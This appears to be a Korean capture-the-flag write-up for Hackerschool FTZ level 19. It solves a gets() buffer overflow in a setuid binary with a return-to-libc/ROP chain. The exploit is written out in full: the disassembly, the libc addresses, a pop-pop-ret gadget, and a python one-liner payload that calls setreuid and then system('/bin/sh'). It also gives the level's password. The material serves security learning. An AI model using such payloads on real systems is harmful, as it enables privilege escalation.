---
sort: 19
---

# Level 19

```note
id : level19

password : swimming in pink
```

hint를 보면 attackme의 소스코드가 나온다.<br>
attackme에 setuid가 걸려있으니 얘를 공격해보자.

```c
main()
{ char buf[20];
  gets(buf);
  printf("%s\n",buf);
}
```

간단한 bof문제이다. 하지만 setuid가 걸려있지 않기 때문에 단순히 쉘코드를 입력하면 쉘을 얻더라도 권한이 그대로인 쉘을 획득한다.<br>
따라서 system을 통해 쉘을 실행하기 전에 `setreuid(level20's uid)`를 해줘야한다.<br><br>
먼저 main함수의 return address를 변조하기 위해 buf의 위치를 파악한 후 padding길이를 구한다.

<pre>
(gdb) disas main
Dump of assembler code for function main:
0x08048440 (main+0):	push   %ebp
0x08048441 (main+1):	mov    %esp,%ebp
0x08048443 (main+3):	sub    $0x28,%esp
0x08048446 (main+6):	sub    $0xc,%esp

<b>0x08048449 (main+9):	lea    0xffffffd8(%ebp),%eax
0x0804844c (main+12):	push   %eax
0x0804844d (main+13):	call   0x80482f4 (gets) </b>

0x08048452 (main+18):	add    $0x10,%esp
0x08048455 (main+21):	sub    $0x8,%esp
0x08048458 (main+24):	lea    0xffffffd8(%ebp),%eax
0x0804845b (main+27):	push   %eax
0x0804845c (main+28):	push   $0x80484d8
0x08048461 (main+33):	call   0x8048324 (printf)
0x08048466 (main+38):	add    $0x10,%esp
0x08048469 (main+41):	leave  
0x0804846a (main+42):	ret
</pre>

id 명령어를 이용해 level20의 uid 값을 구한 후, objdump를 통해 setreuid, system 함수, "/bin/sh"의 위치를 알아낸다.<br>
level11에서 system함수, "/bin/sh"의 위치를 알아낼 때처럼 똑같이 하면 된다.

```bash
[level19@ftz tmp]$ id level20
uid=3100(level20) gid=3100(level20) groups=3100(level20)
[level19@ftz tmp]$ ldd ../attackme 
	libc.so.6 => /lib/tls/libc.so.6 (0x42000000)
	/lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
[level19@ftz tmp]$ objdump -d /lib/tls/libc.so.6

... (중략) ...

420d7920 <setreuid>:
420d7920:       55                      push   %ebp
420d7921:       89 e5                   mov    %esp,%ebp
420d7923:       53                      push   %ebx
420d7924:       8b 55 08                mov    0x8(%ebp),%edx
420d7927:       e8 91 da f3 ff          call   420153bd <__i686.get_pc_thunk.bx>

... (후략) ...
```

우선 아래와 같이 먼저 setreuid를 호출하도록 했다. 그러나 setreuid를 호출한 후에 system함수를 호출하기 위해서는 setreuid함수가 끝난 후 esp값을 조율해주어야한다.<br>
esp가 system을 가리키도록 하기 위해서 pop pop ret 가젯을 찾아서 setreuid의 return address에 넣어준다. 이런식으로 ret으로 끝나는 가젯을 찾아서 실행시키는 것을 Return Oriented Programming (ROP)라고 한다.

<img src="/picture/hacker_school/ftz/level19_1.png" width="1000"/>
<img src="/picture/hacker_school/ftz/level19_2.png" width="700"/>


```asm
42015635:       5b                      pop    %ebx
42015636:       5d                      pop    %ebp
42015637:       c3                      ret
```

아래와 같이 payload를 구성하면 쉘을 딸 수 있다.

```bash
# 0x2c byte padding + setreuid + ret addr (pop pop ret gadget) + 3100 (level20's uid) + 3100 + system + 4 byte padding + addr of "/bin/sh"
[level19@ftz level19]$ (python -c "print('A'*0x2c+'\x20\x79\x0d\x42\x35\x56\x01\x42\x1c\x0c\x00\x00\x1c\x0c\x00\x00\xc0\xf2\x03\x42\x41\x41\x41\x41\xa4\x7e\x12\x42\n')";cat) | ./attackme 
B5VBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA y

my-pass
```

```tip
## 알게 된 점

buffer overflow, Return Oriented Programming (ROP)
```